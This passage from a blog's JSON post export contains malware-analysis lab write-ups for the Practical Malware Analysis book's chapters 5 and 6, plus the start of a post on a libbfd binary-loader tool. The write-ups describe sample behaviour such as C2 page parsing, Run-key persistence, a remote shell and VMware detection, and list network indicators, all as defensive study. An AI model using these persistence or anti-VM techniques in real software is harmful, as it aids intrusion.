style=\"color:#004F98;\"><strong>&quot;Printf&quot;</strong></span>\n function that IDA wasn&#39;t able to identify.</p>\n</li>\n</ul>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q3 :</strong></span>\nWhat is the purpose of this program? </p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<p>  Now we can tell that this function searchs for the status of the internet and prints it along with a return value (1) if connected (0) if not&quot;.</p>\n<hr>\n<hr>\n<h1><span style=\"color:#004F98;\"><strong>Lab 6-2 :</strong></span></h1>\n<p><span style=\"color:#00FFFF;\"><strong>Q1 :</strong></span>\nWhat operation does the first subroutine called by main perform?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<p> The first function is the same functions mentioned in &quot;Lab 6-1&quot; which was an  <span style=\"color:#004F98;\"><strong>IF-Statement</strong></span> that decides if the internet is connected or not.</p>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q2 :</strong></span>\nWhat is the subroutine located at 0x40117F?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<p>This function was also mentioned in &quot;Lab 6-1&quot; which was a <span style=\"color:#004F98;\"><strong>&quot;Printf&quot;</strong></span>\n function that IDA wasn&#39;t able to identify</p>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q3 :</strong></span>\nWhat does the second subroutine called by main do?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<ul>\n<li><p>Fisrt, we see &quot;InternetOpenA&quot; and &quot;InternetOpenUrlA&quot; functions which are used to open an &quot;Internet Explorer&quot; connection and navigate to the &quot;<a href=\"http://www.practicalmalwareanalysis.com/cc.htm\">http://www.practicalmalwareanalysis.com/cc.htm</a>&quot; HTML page.</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch6/2-3-a.png\" alt=\"Alt text\"> </p>\n</li>\n<li><p>After that, a comparison occures to test if that connection happened. Then, we see a call to &quot;InternetReadFile&quot; that will be used to read a 200 Bytes from the HTML page.</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch6/2-3-b.png\" alt=\"Alt text\"></p>\n</li>\n<li><p>Again,  a comparison occures to test if that command has been executed if so, it will test if a sequence of characters are equals to &quot;3C&quot;, &quot;21&quot;, &quot;20&quot; and &quot;20&quot; which in ASCII are &quot;&lt;!--&quot; ,  this format is the comment format in HTML.</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch6/2-3-c.png\" alt=\"Alt text\"></p>\n</li>\n</ul>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q4 :</strong></span>\nWhat type of code construct is used in this subroutine?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<p>The main constructs in this code are &quot;IF&quot; statments to check the execution of commands and an &quot;Array of characters&quot; to store the bytes of the comment in the HTML page.</p>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q5 :</strong></span>\nAre there any network-based indicators for this program?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<p>There are two-network indicators:</p>\n<ul>\n<li>The program uses the HTTP User-Agent Internet Explorer 7.5/pma.</li>\n<li>The program downloads the web page located at: <a href=\"http://www.practicalmalwareanalysis.com/cc.htm\">http://www.practicalmalwareanalysis.com/cc.htm</a>.</li>\n</ul>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q6 :</strong></span>\nWhat is the purpose of this malware?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<p> The main purpose of the program is to search if the intrnet connection is set or not, If it is, it will open Internet Explorer and download an HTML-Web page and search for a certain character stored in the page as a comment and execute this command character and print &quot;Success: Parsed command is @&quot;, were @ is the command, If successful, the program will sleep for 1 minute and then terminate.</p>\n<hr>\n<hr>\n<h1><span style=\"color:#004F98;\"><strong>Lab 6-3 :</strong></span></h1>\n<p><span style=\"color:#00FFFF;\"><strong>Q1 :</strong></span>\nCompare the calls in main to Lab 6-2’s main method. What is the new \nfunction called from main?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<p>The new called function is  &quot;sub_401130&quot; which was in the &quot;Lab06-02.exe&quot;.</p>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q2 :</strong></span>\nWhat parameters does this new function take?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<p>There are 2 parameters being pushed onto the stack:</p>\n<ul>\n<li>The first is a long pointer to the argv ( arg[0] which is a reference to a string containing the current program&#39;s name.)</li>\n<li>The second is a char which contain the value in EAX ( the returning value from &quot;sub_401040&quot;.)</li>\n</ul>\n<p>  <img src=\"/assets/images/Tutorials-Labs/PMAch6/3-2.png\" alt=\"Alt text\"></p>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q3 :</strong></span>\nWhat major code construct does this function contain?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<p>IDA-PRO has already identified the main construct as a <span style=\"color:#00FFFF;\"><strong>Switch case</strong></span> statment with a jump table technic. </p>\n<p> <img src=\"/assets/images/Tutorials-Labs/PMAch6/3-3.png\" alt=\"Alt text\"></p>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q4 :</strong></span>\nWhat can this function do?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<p> The switch statment can do 6 options depende on the case, The options are :</p>\n<ul>\n<li>Create the path &quot; C:\\Temp&quot; if it doesn&#39;t already exist. </li>\n<li>Copy the file &quot;Lab06-03.exe&quot; to &quot;C:\\Temp\\cc.exe.&quot;</li>\n<li>Delete the file &quot;C:\\Temp\\cc.exe&quot; if it exists.</li>\n<li>Set a value in the Windows registry found in &quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot; under the name of &quot;Malware&quot; to make the &quot;C:\\Temp\\cc.exe.&quot; start at system boot, (gainig persistence)</li>\n<li>Sleep for 100 seconds. </li>\n<li>Print &quot;Error 3.2: Not a valid command provided.&quot;</li>\n</ul>\n<p>   <img src=\"/assets/images/Tutorials-Labs/PMAch6/3-4.png\" alt=\"Alt text\"></p>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q5 :</strong></span>\nAre there any host-based indicators for this malware?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<p>Coping the program to &quot;C:\\Temp\\cc.ex&quot; and seting it as a &quot;start at system boot&quot; process are considerable host-based indicators.</p>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q6 :</strong></span>\nWhat is the purpose of this malware?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<p>The main purpose of the program is to search if the intrnet connection is set or not, If it is, it will open Internet Explorer and download an HTML-Web page and search for a certain character stored in the page as a comment, The character will be tested in Switch statment to determine what action will be taken, All options are a guarantee that the program will start at system boot, Finally it prints &quot;Success: Parsed command is @&quot;, were @ is the command, If it all done, the program will sleep for 1 minute and then terminate.</p>\n<hr>\n<hr>\n<h1><span style=\"color:#004F98;\"><strong>Lab 6-4 :</strong></span></h1>\n<p><span style=\"color:#00FFFF;\"><strong>Q1 :</strong></span>\nWhat is the difference between the calls made from the main method in Labs 6-3 and 6-4?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<p>We can see that there is nothing changed in the functions called by the main method.</p>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q2 :</strong></span>\nWhat new code construct has been added to main?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<p>We see a <span style=\"color:#004F98;\"><strong>Loop-Statement</strong></span> has been added, &quot;var_c&quot; is the counter for this loop which was intialized to 0 and incremented by 1 every cycle untill it reatches 1440 &quot;24 hours&quot;, it will break.</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch6/4-2.png\" alt=\"Alt text\"> </p>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q3 :</strong></span>\nWhat is the difference between this lab’s parse HTML function and \nthose of the previous labs?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<ul>\n<li>The new &quot;sub_401040&quot; now takes argument which is the counter of the loop.</li>\n<li>A new variable &quot;szAgent&quot; has been created and populated with the formatted User-Agent &quot;Internet Explorer 7.50/pma%d.&quot;</li>\n<li>After that, we see &quot;Sprintf&quot; is being called, which creates the string and stores it in the destination buffer.</li>\n<li>This means that every time the counter increases, the User-Agent will change.</li>\n</ul>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch6/4-3.png\" alt=\"Alt text\"></p>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q4 :</strong></span>\nHow long will this program run? (Assume that it is connected to the \nInternet.)</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<p>Assuming that the Internet is connected, the loop will be taken the 1440 cycle and sleep 60000 milisecond (1-minute) after each cylce, So this program will terminate after 1440 minute <span style=\"color:#004F98;\"><strong>(Typically 24 hours).</strong></span></p>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q5 :</strong></span>\nAre there any new network-based indicators for this malware?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<p>There are two-network indicators:</p>\n<ul>\n<li>The program uses the HTTP User-Agent Internet Explorer 7.5/pma%d, , where %d is the number of minutes the program has been running.</li>\n<li>The program downloads the web page located at: <a href=\"http://www.practicalmalwareanalysis.com/cc.htm\">http://www.practicalmalwareanalysis.com/cc.htm</a>.</li>\n</ul>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q6 :</strong></span>\nWhat is the purpose of this malware</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<p>By opining the script in VScode we see \nThe main purpose of the program is to search if the intrnet connection is set or not, If it is, it will open Internet Explorer and download an HTML-Web page and search for a certain character stored in the page as a comment, The character will be tested in Switch statment to determine what action will be taken, All options are a guarantee that the program will start at system boot, Finally it prints &quot;Success: Parsed command is @&quot;, were @ is the command, If it all done, the program will sleep for 1 minute, then repeat, After a full 24-hours of repreating the program will terminate.</p>\n<hr>\n<hr>\n<p align=\"center\"><span style=\"color:#00FFFF;\">THE END</span></p>\n\n\n\n<hr>\n<hr>\n"
  },
  {
    "id": "/post/pmach5",
    "slug": "pmach5",
    "title": "Chapter-5 PMA Write-up",
    "description": "A solution to chapter-5 lab from (Practical Malware Analysis) Book",
    "date": "April 26, 2024",
    "readTime": "9 min read",
    "tags": [
      "Malware"
    ],
    "category": "Tutorials & Labs",
    "imageUrl": "/assets/images/Tutorials-Labs/PMAch5/Q1.png",
    "content": "<p><span style=\"color:#00FFFF;\"><strong>Introduction :</strong></span></p>\n<p>Analyze the malware found in the file Lab05-01.dll using only IDA Pro. The \ngoal of this lab is to give you hands-on experience with IDA Pro. If you’ve \nalready worked with IDA Pro, you may choose to ignore these questions and \nfocus on reverse-engineering the malware.</p>\n<hr>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q1 :</strong></span>\nWhat is the address of DllMain?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<p> After using a filter and search for DllMain we will see that its address is : <span style=\"color:#004F98;\"><strong>1000D02E</strong></span>.</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch5/Q1.png\" alt=\"Q1\"></p>\n<hr>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q2 :</strong></span>\nUse the Imports window to browse to gethostbyname. Where is the import located?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<p> Using a functions-filter and search for the &quot;gethostbyname&quot; import will leads us to its location in <span style=\"color:#004F98;\"><strong>&quot;100163CC&quot;</strong></span>.</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch5/Q2.png\" alt=\"Q2\"></p>\n<hr>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q3 :</strong></span>\nHow many functions call gethostbyname?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<p>  By using the Xref graph view we will see that the &quot;gethostbyname&quot; import is called <strong>5-times</strong>.</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch5/Q3.png\" alt=\"Q3\"></p>\n<hr>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q4 :</strong></span>\nFocusing on the call to gethostbyname located at 0x10001757, can you figure out which DNS request will be made?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<p> By jumping to 0x10001757 we will see the instruction:\n mov     eax,   off_10019040 \nAlong with an IDA-PRO comment says :\n&quot;[This is RDO]pics.praticalmalwareanalys&quot; which is the value stored in eax (the parameter of our function)\nSo the requested DNS is: <span style=\"color:#004F98;\"><strong>pics.practicalmalwareanalysis.com</strong></span>.</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch5/Q4.png\" alt=\"Q4\"></p>\n<hr>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q5 :</strong></span>\nHow many local variables has IDA Pro recognized for the subroutine at \n0x10001656?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<p>By using pseudocode view we wil see that there are <span style=\"color:#004F98;\"><strong>23</strong></span> local variable ( the ones with negative offsets).</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch5/Q5.png\" alt=\"Q5\"></p>\n<hr>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q6 :</strong></span>\nHow many parameters has IDA Pro recognized for the subroutine at \n0x10001656?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<p>Only <span style=\"color:#004F98;\"><strong>one</strong></span>  that IDA Pro has recognized, It has been named to <span style=\"color:#004F98;\"><strong>&quot;lpThreadParameter&quot;</strong></span></p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch5/Q6.png\" alt=\"Q6\"></p>\n<hr>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q7 :</strong></span>\nUse the Strings window to locate the string \\cmd.exe /c in the disassembly. Where is it located?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<p>After using a string filter for the string contains &quot;\\cmd.exe /c&quot;, by\ndouble clicking it we will find it at <span style=\"color:#004F98;\"><strong>&quot;10095B34&quot;</strong></span>.</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch5/Q7.png\" alt=\"Q7\"></p>\n<hr>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q8 :</strong></span>\nWhat is happening in the area of code that references \\cmd.exe /c?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<ul>\n<li><p>Now we see that some values are pushed into the stack that catch out eyes like &quot;quit&quot;, &quot;exit&quot;, &quot;minstall&quot; and &quot;inject&quot;.</p>\n<p>  <img src=\"/assets/images/Tutorials-Labs/PMAch5/Q8-a.png\" alt=\"Q8-a\"></p>\n<p>  <img src=\"/assets/images/Tutorials-Labs/PMAch5/Q8-b.png\" alt=\"Q8-b\"></p>\n</li>\n<li><p>Scrolling down more, we an array say &quot;Encrypt magic for this Remote Shell Session&quot;.</p>\n<p>  <img src=\"/assets/images/Tutorials-Labs/PMAch5/Q8-c.png\" alt=\"Q8-c\"></p>\n</li>\n<li><p>I don&#39;t know what is happening here for certain, best guess will be that this is a remote shell session.</p>\n</li>\n</ul>\n<hr>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q9 :</strong></span>\nIn the same area, at 0x100101C8, it looks like dword_1008E5C4 is a global variable that helps decide which path to take. How does the malware set dword_1008E5C4? </p>\n<p>(Hint: Use dword_1008E5C4&#39;s cross-references.)</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<ul>\n<li><p>The &quot;dword_1008E5C4&quot; is in .data  section, So using Xref we will see 2 functions read its data and only one writes it</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch5/Q9-a.png\" alt=\"Q9-a\"></p>\n</li>\n<li><p>By double clicking on it, we notice that the &quot;dword_1008E5C4&quot; stores what is in EAX which is the returning value of calling sub_10003695</p>\n<p> <img src=\"/assets/images/Tutorials-Labs/PMAch5/Q9-b.png\" alt=\"Q9-b\"></p>\n</li>\n<li><p>By gitting into sub_10003695 we will see a call to &quot;GetVersionExA&quot; function which is responsible for gathering some information about the OS version (Read more from <a href=\"https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-osversioninfoa\">here</a>)\nand compare it with &quot;2&quot; later in &quot;0x100036B7&quot;</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch5/Q9-c.png\" alt=\"Q9-c\"></p>\n</li>\n</ul>\n<p><em><strong>In Breif :</strong></em> \n    the dword_1008E5C4 stores <span style=\"color:#004F98;\"><strong>the OS version.</strong></span></p>\n<hr>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q10 :</strong></span>\nA few hundred lines into the subroutine at 0x1000FF58, a series of comparisons use memcmp to compare strings. What happens if the string comparison to robotwork is successful (when memcmp returns 0)?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<ul>\n<li><p>As we see, if the string comparison to robotwork is successful (when memcmp returns 0) the The jnz at will not be taken and the call to &quot;sub_100052A2&quot; will occure,</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch5/Q10-a.png\" alt=\"Q10-a\"></p>\n</li>\n<li><p>By going to &quot;sub_100052A2&quot; we will see that it gather some information about &quot;SOFTWARE\\Microsoft\\Windows\\CurrentVersion&quot;</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch5/Q10-b.png\" alt=\"Q10-b\"></p>\n</li>\n</ul>\n<hr>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q11 :</strong></span>\nWhat does the export PSLIST do?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<ul>\n<li><p>After finding PSLIST and by using the graphical view we will see that there is to ways the execution my follow depending on te result of calling &quot;sub_100036C3&quot;\n<img src=\"/assets/images/Tutorials-Labs/PMAch5/Q11-c.png\" alt=\"Q11-c\"></p>\n</li>\n<li><p>The &quot;sub_100036C3&quot; looks like it gathetr some information about &quot;OS version&quot;.\n<img src=\"/assets/images/Tutorials-Labs/PMAch5/Q11-b.png\" alt=\"Q11-b\"></p>\n</li>\n<li><p>Both ways will lead us to &quot;loc_1000705B&quot; which sent out these information via network socket.\n<img src=\"/assets/images/Tutorials-Labs/PMAch5/Q11-a.png\" alt=\"Q11-a\"></p>\n</li>\n</ul>\n<hr>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q12 :</strong></span>\nUse the graph mode to graph the cross-references from sub_10004E79. \nWhich API functions could be called by entering this function? Based on \nthe API functions alone, what could you rename this function?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<p>Using Xref from &quot;sub_10004E79&quot;, we will see that it uses &quot; GetSystemDefaultLangID&quot;, &quot;sprintf&quot;, &quot;strlen&quot;, so I would name it &quot;_get_language_ID&quot; \n<img src=\"/assets/images/Tutorials-Labs/PMAch5/Q12.png\" alt=\"Q12\"></p>\n<hr>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q13 :</strong></span>\nHow many Windows API functions does DllMain call directly? How many \nat a depth of 2?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<p>Using a custom cross-reference graph \nfor &quot;0x1000D02E&quot;, we will see that there is 4 functions called directly by &quot;_DllMain@12&quot;.\n<img src=\"/assets/images/Tutorials-Labs/PMAch5/Q13.png\" alt=\"Q13\"></p>\n<hr>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q14 :</strong></span>\nAt 0x10001358, there is a call to Sleep (an API function that takes one \nparameter containing the number of milliseconds to sleep). Looking \nbackward through the code, how long will the program sleep if this code \nexecutes?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<p>The sleep function takes eax as it&#39;s parameter, by going back in code we find that:</p>\n<ul>\n<li>eax stores the string &quot;[This is CTI]30&quot;.</li>\n<li>by adding &quot;0D&quot; the pointer moves by 13 offsets leaving only &#39;30&#39; in eax</li>\n<li>calling atoi is just a method to convert string-type to int-type.</li>\n<li>At last the &#39;30&#39; is multiplied by &#39;1000&#39; and stored in eax</li>\n<li>finally eax is passed to &quot;Sleep&quot;, So the program will sleep by 30,000 milli_second (30 second).</li>\n</ul>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch5/Q14.png\" alt=\"Q14\"></p>\n<hr>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q15 :</strong></span>\nAt 0x10001701 is a call to socket. What are the three parameters?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<p>Looking at this address we can see a call to socket which takes 3 parameters (protocol, type, and af) all of which are pushed to the stack prior to the call</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch5/Q15.png\" alt=\"Q15\"></p>\n<hr>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q16 :</strong></span>\nUsing the MSDN page for socket and the named symbolic constants functionality in IDA Pro, can you make the parameters more meaningful? \nWhat are the parameters after you apply changes?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<p>By going to the <a href=\"https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-socket\">MSDN Socket Function</a> we will be able to see the meaning of each parameter :</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">parameters</th>\n<th align=\"left\">symbolic_constants</th>\n<th align=\"left\">meaning</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">2</td>\n<td align=\"left\">AF_INET</td>\n<td align=\"left\">The Internet Protocol version 4 (IPv4) address family.</td>\n</tr>\n<tr>\n<td align=\"left\">1</td>\n<td align=\"left\">SOCK_STREAM</td>\n<td align=\"left\">A socket type that provides sequenced, reliable, two-way, connection-based byte streams with an OOB data transmission mechanism. This socket type uses the Transmission Control Protocol (TCP) for the Internet address family (AF_INET or AF_INET6).</td>\n</tr>\n<tr>\n<td align=\"left\">6</td>\n<td align=\"left\">IPPROTO_TCP</td>\n<td align=\"left\">The Transmission Control Protocol (TCP). This is a possible value when the af parameter is AF_INET or AF_INET6 and the type parameter is SOCK_STREAM.</td>\n</tr>\n</tbody></table>\n<hr>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q17 :</strong></span>\nSearch for usage of the in instruction (opcode 0xED). This instruction is used with a magic string VMXh to perform VMware detection. Is that in use\nin this malware? Using the cross-references to the function that executes \nthe in instruction, is there further evidence of VMware detection?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<ul>\n<li><p>By searching for &quot;ED&quot; as a sequance of bytes we can see that it&#39;s in use with the string &quot;VMXh&quot; in &quot;sub_10006196&quot;</p>\n<p>  <img src=\"/assets/images/Tutorials-Labs/PMAch5/Q17-b.png\" alt=\"Q17-b\"></p>\n</li>\n<li><p>Usin an &quot;Xref to&quot; graph for sub_10006196 will tell us that this function had been called 3-times by &quot;InstallSB&quot;, &quot;InstallSA&quot; and &quot;InstallRT&quot;.</p>\n<p>  <img src=\"/assets/images/Tutorials-Labs/PMAch5/Q17-c.png\" alt=\"Q17-c\"></p>\n</li>\n<li><p>By diving into each one of them we will found a comparsion that decide if th VMWare is deticted go to &quot;loc_1000D870&quot; then cancel the installaion, if not go to &quot;loc_1000D88E&quot; and continue.</p>\n<p>  <img src=\"/assets/images/Tutorials-Labs/PMAch5/Q17-a.png\" alt=\"Q17-a\"></p>\n</li>\n</ul>\n<hr>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q18 :</strong></span>\nJump your cursor to 0x1001D988. What do you find? </p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<p>By going to &quot;0x1001D988&quot; all we can see is a collection of random data.</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch5/Q18.png\" alt=\"Q18\"></p>\n<hr>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q19 :</strong></span>\nIf you have the IDA Python plug-in installed (included with the commercial version of IDA Pro), run Lab05-01.py, an IDA Pro Python script \nprovided with the malware for this book. (Make sure the cursor is at 0x1001D988.) What happens after you run the script?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<p>By runing the py_Script we will see that these random data are changing, but still random.</p>\n<hr>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q20 :</strong></span>\nWith the cursor in the same location, how do you turn this data into a single ASCII string?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<p>By pressing (A key) we can combine the whole string in ASCII form, now we can see this random text before applying the script :</p>\n<blockquote>\n<p>-1::&#39;u&lt;&amp;u!=&lt;&amp;u746&gt;1::&#39;yu&amp;!&#39;&lt;;2u106:101u3:&#39;u%&#39;46!&lt;649u849&quot;4&#39;0u4;49,&amp;&lt;&amp;u47uo|dgfa</p>\n</blockquote>\n<p>turns into that readable text after applying it :</p>\n<blockquote>\n<p>xdoor is this backdoor, string decoded for practical malware analysis ab :)1234</p>\n</blockquote>\n<hr>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q21 :</strong></span>\nOpen the script with a text editor. How does it work?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<p>By opining the script in VScode we see </p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch5/Q21.png\" alt=\"Q21\"></p>\n<p>Now we understand what happend:</p>\n<ul>\n<li>The variable &quot;sea&quot; stores the location of the curser which is our start address.</li>\n<li>The for loop is set to excute it&#39;s internal instructions for the next (50) memory address.</li>\n<li>The internal instructions of the for loop are to preformed an (XOR) operation for every time the loop happened.</li>\n<li>The overview of the code is that it does an (XOR) operation for our random (50) data which will turn them too more human readable data.</li>\n</ul>\n<hr>\n<hr>\n<p align=\"center\"><span style=\"color:#00FFFF;\">THE END</span></p>\n\n\n\n<hr>\n<hr>\n"
  },
  {
    "id": "/post/the-binary-loader",
    "slug": "the-binary-loader",
    "title": "The Binary Loader",
    "description": "A Linux tool to load binary and show its details without running it",
    "date": "April 14, 2024",
    "readTime": "4 min read",
    "tags": [
      "Linux",
      "Static Analysis"
    ],
    "category": "Tools",
    "imageUrl": "/assets/images/tools/the_binary_loader",
    "content": "<h1><strong>The_Binary_Loader</strong></h1>\n<h2>This is a Linux tool to load binary and show its details without running it.</h2>\n<p>Because nearly all analysis tools needs to parse and (statically) load binary files, it makes sense to have a common framework that provides this ability. In this program, I used <strong>libbfd</strong> to design and implement such a framework to reinforce what I’ve learned so far about binary formats. I also added a small terminal interface called <strong>&quot;load&quot;</strong> to make it easy to use.</p>\n<p><strong>You’ll see the binary loading framework again in almost all of upcoming tools</strong></p>\n<p><strong>Note</strong> that this is completely different from the dynamic loader provided\nby the OS, whose job it is to load binaries into memory to execute them</p>\n<h2><strong>What Is libbfd?</strong></h2>\n<p>The Binary File Descriptor library (libbfd) provides a common interface\nfor reading and parsing all popular binary formats, compiled for a wide\nvariety of architectures. This includes ELF and PE files for x86 and x86-64\nmachines. By basing the binary loader on libbfd, we can automatically\nsupport all these formats without having to implement any format-specific\nsupport.\nThe BFD library is part of the GNU project and is used by many applications in the binutils suite, including objdump, readelf, and gdb. It provides\ngeneric abstractions for all common components used in binary formats,\nsuch as headers describing the binary’s target and properties, lists of sections, sets of relocations, symbol tables, and so on. On Ubuntu, libbfd is part\nof the binutils-dev package.\nYou can find the core libbfd API in /usr/include/bfd.h.</p>\n<h2><strong>prerequisites</strong></h2>\n<p>Install the <strong>GNU project</strong> (if not already installed), You can use these commands to do that:</p>\n<pre><code>sudo apt update\nsudo apt install binutils-dev\n</code></pre>\n<h2><strong>How to install</strong></h2>\n<ul>\n<li><p><strong>Automatic  Intstallation:</strong></p>\n<ul>\n<li><p>Open your linux terminal and run the following commands:</p>\n<pre><code>chmod +x install.sh\n./install.sh\n</code></pre>\n</li>\n</ul>\n</li>\n<li><p><strong>Manual Installation:</strong></p>\n<ol>\n<li><p>Compile the <strong>&quot;loader_demo.cc&quot;</strong> file an link it with <strong>&quot;load.o&quot;</strong> with the flag <strong>&quot;-lbfd.&quot;</strong></p>\n<pre><code>sudo g++ -std=c++11 -o load loader_demo.cc loader.o -lbfd\n</code></pre>\n</li>\n<li><p>Move the files <strong>&quot;bfd.h, loader.h, loader.o, load&quot;</strong> to the <strong>&quot;/usr/bin&quot;</strong> directory.</p>\n<pre><code>sudo mv bfd.h loader.h loader.o load /usr/bin\n</code></pre>\n</li>\n</ol>\n</li>\n</ul>\n<h2><strong>Loader API</strong></h2>\n<p>At its core, the whole API centers around only two functions. </p>\n<ol>\n<li><strong>load_binary function</strong>, which takes the name of a binary file to\nload (fname), a pointer to a Binary object to contain the loaded binary (bin), and a descriptor of the binary type (type). It loads the requested binary into the bin parameter and returns an integer value of 0 if the loading process was successful or a value less than 0 if it was not successful</li>\n<li><strong>unload_binary</strong>, which simply takes a pointer to a previously\nloaded Binary object and unloads it.</li>\n</ol>\n<h2><strong>The &quot;load&quot; interface</strong></h2>\n<p>Besides the loader, I added a small terminal interface called <strong>&quot;load&quot;</strong> to make it easier to use. The load program can display some of the most important features of the loader like:</p>\n<ul>\n<li>Binary details</li>\n<li>Sections details</li>\n<li>sections content (raw data &amp; ASCII representation)</li>\n<li>symbols details</li>\n</ul>\n<p>If you want to display more, Use the <a href=\"https://ftp.gnu.org/old-gnu/Manuals/bfd-2.9.1/html_mono/bfd.html\"><strong>bfd.h 